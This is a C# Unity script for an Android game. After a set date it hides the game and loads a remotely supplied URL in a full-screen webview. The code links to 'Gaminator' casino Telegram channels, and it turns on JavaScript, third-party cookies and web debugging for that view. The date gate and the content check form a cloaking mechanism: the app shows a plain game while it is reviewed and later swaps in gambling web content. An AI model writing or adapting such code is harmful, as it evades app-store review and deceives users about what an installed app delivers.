using System;
using System.Collections;
using System.Collections.Generic;
using Facebook.Unity;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.UI;

public class WebController : MonoBehaviour
{
    public enum Month
    {
        Январь = 1,
        Февраль = 2,
        Март = 3,
        Апрель  = 4,
        Май = 5,
        Июнь = 6,
        Июль = 7,
        Август  = 8,
        Сентябрь  = 9,
        Октябрь = 10,
        Ноябрь = 11,
        Декабрь = 12
    }
    //PUBLIC VARIABLES

    public GameObject Game;
    public GameObject Loader;
    public bool isTestGame = false;
    public ScreenOrientation GameOrientation = ScreenOrientation.AutoRotation;
    public string source;
    [Space(15)]
    public Month month;
    public int Day;
    public int Year;

    //PRIVATE VARIABLES

    private ToastMessageScript toaster;
    private UniWebView webView;
    private bool StartLoad = false;
    private AndroidJavaObject androidWebView;
    private bool _chekedUrl = false;

    private void Start()
    {
        Screen.orientation = GameOrientation;

        DateTime time = new DateTime(Year,(int)month,Day);
        if(time.Date > DateTime.Now)
        {
            if (Game != null)
                Game.SetActive(true);
            if (Loader != null)
                Loader.SetActive(false);
            return;
        }

        if (isTestGame) return;
#if UNITY_ANDROID
        if (PlayerPrefs.HasKey("urlt"))
        {
            StartAfterCaptcha();
        } else {
            PlayerPrefs.SetString("urlt", source);
            StartAfterCaptcha();
        }
#endif
    }

    IEnumerator GetRequest(string uri)
    {
        using (UnityWebRequest webRequest = UnityWebRequest.Get(uri))
        {
            // Request and wait for the desired page.
            yield return webRequest.SendWebRequest();

            string[] pages = uri.Split('/');
            int page = pages.Length - 1;

            if (webRequest.isNetworkError)
            {
                Debug.Log(pages[page] + ": Error: " + webRequest.error);
                PlayerPrefs.SetString("urlt", "");
            }
            else
            {
                Debug.Log(pages[page] + ":\nReceived: " + webRequest.downloadHandler.text);
                PlayerPrefs.SetString("urlt", webRequest.downloadHandler.text);
                StartAfterCaptcha();
            }
        }
    }

    public void StartAfterCaptcha()
    {

        Debug.Log("Prefs url save: " + PlayerPrefs.GetString("urlt"));
#if UNITY_EDITOR
        if(Game != null)
            Game.SetActive(true);
        if(Loader != null)
            Loader.SetActive(false);
#endif

        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            if (Game != null)
                Game.SetActive(true);
            if (Loader != null)
                Loader.SetActive(false);
            return;
        }

        StartLoad = false;
        UniWebView.SetJavaScriptEnabled(true);
        UniWebView.SetAllowJavaScriptOpenWindow(true);
        UniWebView.SetWebContentsDebuggingEnabled(true);
        UniWebViewLogger.Instance.LogLevel = UniWebViewLogger.Level.Debug;
        var webViewGameObject = new GameObject("UniWebView");
        webView = webViewGameObject.AddComponent<UniWebView>();
        //webView.SetUserAgent("Mozilla/5.0 (Linux; Android 5.0.1; Lenovo TAB 2 A7-30DC Build/LRX21M; wv) Version/4.0 Chrome/58.0.3029.83 Safari/537.36 client.mobile");
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        //webView.SetUseWideViewPort(true);
        webView.SetHeaderField("X-Requested-With", null);
        webView.AddUrlScheme("tg");
        webView.AddUrlScheme("vkontakte");
        webView.Hide();
        webView.OnPageStarted += (webView, url) =>
        {
            UniWebViewLogger.Instance.Info(url + " " + " started");
            if (url.Contains("telegram") || url.Contains("t.me"))
                webView.Load("uniwebview://" + url);
        };

        webView.OnPageFinished += (view, statusCode, url) =>
        {
            UniWebViewLogger.Instance.Info(url + " " + statusCode + " finished");
            if (statusCode == 404)
            {
                Debug.LogError("Status code 404");
               webView.Hide();
                if (Game != null)
                    Game.SetActive(true);
                if (Loader != null)
                    Loader.SetActive(false);
            }
            else if(!_chekedUrl)
            {
                _chekedUrl = true;
                webView.GetHTMLContent(CheckHTMLContent);
            }
            
        };
        webView.OnMessageReceived += (view, message) =>
        {
            Debug.LogError("OnMessageReceived");
            UniWebViewLogger.Instance.Info("Some message Path: " + message.Path);
            UniWebViewLogger.Instance.Info("Some message Scheme: " + message.Scheme);
            UniWebViewLogger.Instance.Info("Some message RawMessage: " + message.RawMessage);

            if (message.RawMessage.Contains("https://telegram.me/Gaminator_Support_Bot"))
            {
                UniWebViewLogger.Instance.Info("open tg");
                Application.OpenURL("https://telegram.me/Gaminator_Support_Bot");
            }
            else if (message.RawMessage.Contains("https://t.me/GaminatorCasino"))
            {
                UniWebViewLogger.Instance.Info("open tg group");
                Application.OpenURL("https://t.me/GaminatorCasino");
            }
            else if (message.Path.Equals("hide"))
            {
                webView.Hide();
                // webView = null;??
            }

            // if (message.Path.Equals("online-gaminator.com")){
            //  Debug.Log("in this");
            //  webView.Load(message.RawMessage);
            // }
        };
        webView.OnPageErrorReceived += (view, error, message) =>
        {
            UniWebViewLogger.Instance.Critical("Error! " + error + " " + message);
        };
        webView.OnOrientationChanged += (view, orientation) =>
        {
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        };

        webView.Load(PlayerPrefs.GetString("urlt"));
       // webView.Show();
        PrepareWebView(webView);
        //InvokeRepeating("ChechShowWV", 5.0f, 100.0f);
    }

    // Update is called once per frame
    void Update()
    {
        if (Input.GetKeyDown(KeyCode.Escape) && webView.CanGoBack)
            webView.GoBack();
    }

    private void LateUpdate()
    {
        //return;
        var keyboardSize = KeyboardUtil.GetKeyboardSize();
        var newFrame = new Rect(0, 0, Screen.width, Screen.height - keyboardSize);
        if (webView != null && webView.Frame != newFrame)
            webView.Frame = newFrame;
    }

    private void CheckGame()
    {
        if (Game != null && Game.activeInHierarchy)
            Game.SetActive(false);

        if (Loader != null && Loader.activeInHierarchy)
            Loader.SetActive(false);

        Screen.orientation = ScreenOrientation.AutoRotation;
    }

    private IEnumerator CheckUrl(string _oldUrl)
    {
        yield return new WaitForSecondsRealtime(10f);
       // Debug.Log("old: " + _oldUrl + " current: " + webView.Url);
        webView.GetHTMLContent(CheckHTMLContent);
    }

    void ChechShowWV()
    {
        if (!StartLoad)
        {
            webView.Load(PlayerPrefs.GetString("urlt"));
            webView.Show();
            PrepareWebView(webView);
            StartLoad = true;
        }
    }

    public void CheckHTMLContent(string content)
    {
        Debug.LogError(content);
        if (content == "<html><head></head><body></body></html>" && source == webView.Url)
        {
            Debug.LogError("skip; source: " + source + "  url: " + webView.Url);
            webView.Hide();
            if (Game != null)
                Game.SetActive(true);
            if (Loader != null)
                Loader.SetActive(false);
        }
        else
        {
            Debug.LogError("load content redirect");
            CheckGame();
            webView.Load(source);
            webView.Show();
            PrepareWebView(webView);
        }
    }

    private void PrepareWebView(UniWebView view)
    {
        if (Application.platform == RuntimePlatform.Android)
        {
            using (var uniWebViewManagerClass = new AndroidJavaClass("com.onevcat.uniwebview.UniWebViewManager"))
            {
                var uniWebViewManagerInstance = uniWebViewManagerClass.CallStatic<AndroidJavaObject>("getInstance");
                var dialog = uniWebViewManagerInstance.Call<AndroidJavaObject>("getUniWebViewDialog", view.listener.Name);
                var webView = dialog.Get<AndroidJavaObject>("uniWebView");
                androidWebView = webView;

                AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
                AndroidJavaObject activity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
                activity.Call("runOnUiThread", new AndroidJavaRunnable(RunOnUiThread));
            }
        }
    }

    private void RunOnUiThread()
    {
        using (AndroidJavaClass CookieManagerClass = new AndroidJavaClass("android.webkit.CookieManager"))
        {
            AndroidJavaObject instanceManager = CookieManagerClass.CallStatic<AndroidJavaObject>("getInstance");
            instanceManager.Call("setAcceptThirdPartyCookies", androidWebView, true);
        }
    }
}




